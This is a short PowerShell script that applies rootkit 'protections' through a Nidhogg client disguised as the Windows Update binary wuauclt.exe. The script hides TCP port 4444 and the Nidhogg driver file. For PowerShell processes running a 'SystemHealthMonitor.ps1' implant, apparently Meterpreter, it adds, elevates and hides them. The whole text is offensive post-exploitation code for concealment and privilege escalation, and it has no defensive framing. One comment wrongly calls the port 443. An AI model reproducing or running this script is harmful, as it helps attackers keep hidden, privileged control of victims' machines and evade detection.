# NidhoggSetup.ps1 - Apply ALL Nidhogg protections

$Client = "C:\Windows\System32\wuauclt.exe"
$Port   = 4444

Write-Host "[+] Applying Nidhogg protections..." -ForegroundColor Green

# 1. Hide the port (443 looks like normal HTTPS)
& $Client port hide $Port tcp remote

# 2. Hide the driver file
& $Client driver hide "C:\Windows\System32\drivers\Nidhogg.sys"

# 3. Start Meterpreter if not already running
$psProcesses = Get-Process -Name "powershell" -ErrorAction SilentlyContinue
foreach ($p in $psProcesses) {
    if ($p.CommandLine -like "*SystemHealthMonitor.ps1*") {
        & $Client process add $p.Id
        & $Client process elevate $p.Id
        & $Client process hide $p.Id
        Write-Host "[+] Hidden PowerShell implant (PID $($p.Id))" -ForegroundColor Green
    }
}

Write-Host "[+] All protections applied (port, process, driver, file)" -ForegroundColor Green